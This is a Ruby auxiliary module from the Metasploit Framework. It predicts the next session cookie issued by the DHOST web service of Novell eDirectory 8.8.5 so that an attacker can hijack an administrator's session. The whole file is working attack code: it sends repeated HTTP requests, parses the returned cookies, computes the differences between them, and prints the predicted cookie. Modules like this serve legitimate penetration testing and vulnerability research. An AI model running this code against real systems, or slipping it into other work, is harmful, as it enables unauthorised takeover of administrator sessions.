##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell eDirectory DHOST Predictable Session Cookie',
			'Description'    => %q{
				This module is able to predict the next session cookie value issued
			by the DHOST web service of Novell eDirectory 8.8.5. An attacker can run
			this module, wait until the real administrator logs in, then specify the
			predicted cookie value to hijack their session.
			},
			'References'     =>
				[
					['OSVDB', '60035'],
				],
			'Author'         => 'hdm',
			'License'        => MSF_LICENSE
		))

		register_options([
			Opt::RPORT(8030),
			OptBool.new('SSL', [true, 'Use SSL', true])
		], self.class)
	end

	def run
		vals = []
		name = ""

		print_status("Making 5 requests to verify predictions...")
		1.upto(6) do

			connect
			req =  "GET /dhost/ HTTP/1.1\r\n"
			req << "Host: #{rhost}:#{rport}\r\n"
			req << "Connection: close\r\n\r\n"
			sock.put(req)
			res = sock.get_once(-1,5)
			disconnect

			cookie = nil
			if(res and res =~ /Cookie:\s*([^\s]+)\s*/mi)
				cookie = $1
				cookie,junk = cookie.split(';')
				name,cookie = cookie.split('=')
				cookie      = cookie.to_i(16)
				vals << cookie
			end
		end

		deltas   = []
		prev_val = nil
		vals.each_index do |i|
			if(i > 0)
				delta = vals[i] - prev_val
				print_status("Cookie: #{i} #{"%.8x" % vals[i]} DELTA #{"%.8x" % delta}")
				deltas << delta
			end
			prev_val = vals[i]
		end

		deltas.uniq!
		if(deltas.length < 4)
			print_status("The next cookie value will be: #{name}=#{"%.8x" % (prev_val + deltas[0])}")
		else
			print_status("The cookie value is less predictable, maybe this has been patched?")
			print_status("Deltas: #{deltas.map{|x| "%.8x" % x}.join(", ")}")
		end
	end

end
